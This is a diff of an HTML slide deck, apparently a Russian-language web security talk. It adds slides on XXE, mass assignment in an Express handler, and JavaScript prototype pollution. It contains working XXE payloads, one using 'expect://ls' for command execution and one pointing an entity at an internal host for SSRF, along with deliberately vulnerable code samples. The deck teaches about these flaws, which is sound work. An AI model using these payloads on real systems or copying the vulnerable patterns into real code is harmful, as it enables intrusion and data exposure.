@@ -280,6 +280,9 @@
 				  	</code></pre>
 				</section>
 				<section>
+					<img src="./assets/xxe_result.png" alt="xxe result">
+				</section>
+				<section>
 					<h6>RCE</h6>
 					<pre class="php"><code data-trim data-noescape>
 					&lt;?php
@@ -293,10 +296,10 @@
 					  // ...
 					?&gt;
 				  	</code></pre>
-					<pre class="xml"><code data-trim data-noescape data-line-numbers="3">
+					<pre class="xml"><code data-trim data-noescape>
 					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
-					&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
+					&lt;!ENTITY xxe SYSTEM "expect://ls" &gt;]&gt;
 					&lt;creds&gt;
 					  &lt;user&gt;&amp;xxe;&lt;/user&gt;
 					  &lt;pass&gt;pass&lt;/pass&gt;
@@ -308,7 +311,8 @@
 				</section>
 				<section>
 					<h6>xxe ssrf</h6>
-					<pre class="xml"><code data-trim data-noescape data-line-numbers="3">
+					<img src="./assets/xxe_ssrf.png" alt="xxe ssrf scheme" width="300px">
+					<pre class="xml"><code data-trim data-noescape>
 					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
 					&lt;!ENTITY xxe SYSTEM "http://internal.com" &gt;]&gt;
@@ -519,6 +523,59 @@
 							&price=1$
 						</span>
 					</p>
+				</section>
+				<section>
+					<h2>Опасный JS</h2>
+				</section>
+				<section>
+					<h3>деструктуризация</h3>
+					<pre class="javascript"><code data-trim data-noescape>
+						const app = express();
+						app.get('/update', (req, res) => {
+						  const user = db.find(req.id);
+						  user = { ...user, ...req.user };
+						  db.save(id, user);
+						});
+					</code></pre>
+				</section>
+				<section>
+					<h2>Prototype pollution</h2>
+				</section>
+				<section>
+					<div class="column2">
+						<pre class="C#"><code data-trim data-noescape>
+							class MyClass {
+								public String toString() {
+									// ...
+								}
+							}
+							var instance = new MyClass();
+							instance.toString();
+						</code></pre>
+						<pre class="javascript"><code data-trim data-noescape>
+							const myClassObject = {
+								toString() {
+									// ...
+								}
+							};
+							const instance = {};
+							instance.__proto__ = myClassObject;
+							instance.toString();
+						</code></pre>
+					</div>
+				</section>
+				<section>
+					<pre class="javascript"><code data-trim data-noescape>
+						const myClassObject = {
+							toString() {
+								// ...
+							}
+						};
+						const instance = {};
+						instance.__proto__ = myClassObject;
+
+						myClassObject.toString = function() { alert(1); };
+					</code></pre>
 				</section>
 
 			</div>
